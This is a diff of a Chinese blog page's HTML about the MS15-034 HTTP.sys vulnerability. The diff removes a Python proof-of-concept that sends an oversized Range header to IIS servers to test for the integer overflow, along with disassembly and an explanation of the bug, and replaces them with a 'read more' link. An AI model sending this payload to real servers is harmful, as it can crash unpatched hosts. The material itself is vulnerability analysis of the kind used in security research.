@@ -93,57 +93,12 @@
             <div class="post-content">
                 
                     <p><strong>现在最多造成蓝屏</strong></p>
-<p><strong>POC</strong></p>
-<blockquote>
-<p>import socket</p>
-<p>import random</p>
-<p>ipAddr =&quot;WebSite&quot;</p>
-<p>hexAllFfff =&quot;18446744073709551615&quot;</p>
-<p>count=0</p>
-<p>req1 =&quot;GET/ HTTP/1.0\r\n\r\n&quot;</p>
-<p>req =&quot;GET/ HTTP/1.1\r\nHost: stuff\r\nRange: bytes=&quot;+str(count)+&quot;-&quot;+ hexAllFfff +&quot;\r\n\r\n&quot;</p>
-<p>print &quot;[*] Audit Started&quot;</p>
-<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
-<p>client_socket.connect((ipAddr, 80))</p>
-<p>client_socket.send(req1)</p>
-<p>boringResp = client_socket.recv(1024)</p>
-<p>if &quot;Microsoft&quot; not in boringResp:</p>
-<p>print &quot;[*] Not IIS&quot;</p>
-<p>exit(0)</p>
-<p>client_socket.close()</p>
-<p>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
-<p>client_socket.connect((ipAddr, 80))</p>
-<p>client_socket.send(req)</p>
-<p>goodResp = client_socket.recv(1024)</p>
-<p>if &quot;Requested Range Not Satisfiable&quot; in goodResp:</p>
-<p>print &quot;[!!] Looks VULN&quot;</p>
-<p>elif &quot; The request has an invalid header name&quot; in goodResp:</p>
-<p>print &quot;[*] Looks Patched&quot;</p>
-<p>else:</p>
-<p>print &quot;[*] Unexpected response, cannot discern patch status&quot;</p>
-<p>print goodResp </p>
-</blockquote>
-<p>**<br>**</p>
-<p><strong>漏洞原理：</strong></p>
-<p><strong>HTTP.sys 在处理内核缓存数据时，</strong></p>
-<p>**<br>**</p>
-<blockquote>
-<p>8a8b2112 56  push esi<br>8a8b2113 6a00  push 0<br>8a8b2115 2bc7  sub eax,edi<br>8a8b2117 6a01  push 1<br>8a8b2119 1bca  sbb ecx,edx<br>8a8b211b 51  push ecx<br>8a8b211c 50  push eax<br>8a8b211d e8bf69fbff call HTTP!RtlULongLongAdd (8a868ae1); here**<br>** </p>
-</blockquote>
-<p>**<br>**</p>
-<p><strong>eax1 = eax - edi</strong></p>
-<p><strong>ecx1 = ecx - edx</strong></p>
-<p><strong>RtlULongLongAdd (eax1, ecx1)</strong></p>
-<p>**<br>**</p>
-<p>其中 eax1 与 ecx1 是处理 HTTP 请求中</p>
-<blockquote>
-<p>Range: bytes=&quot;+<strong>offsetlow</strong>+&quot;-&quot;+<strong>offsethigh</strong>+&quot;\r\n\r\n&quot; </p>
-</blockquote>
-<p><strong>当offsetlow = 0 ,offsethigh= 0xFFFFFFFFFFFFFFFF</strong></p>
-<p><strong>时经过 RtlULongLongAdd 操作</strong></p>
-<p><strong>0xFFFFFFFFFFFFFFFF+ 0 + 1 = 0 造成整数溢出</strong></p>
-<p>&nbsp;</p>
-
+                    <div class="read-more">
+                        <a href="/2015/09/16/MS15-034%20HTTP.sys%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" class="read-more-link">
+                            阅读全文
+                            <i class="iconfont icon-readmore"></i>
+                        </a>
+                    </div>
                 
             </div>
         </article>
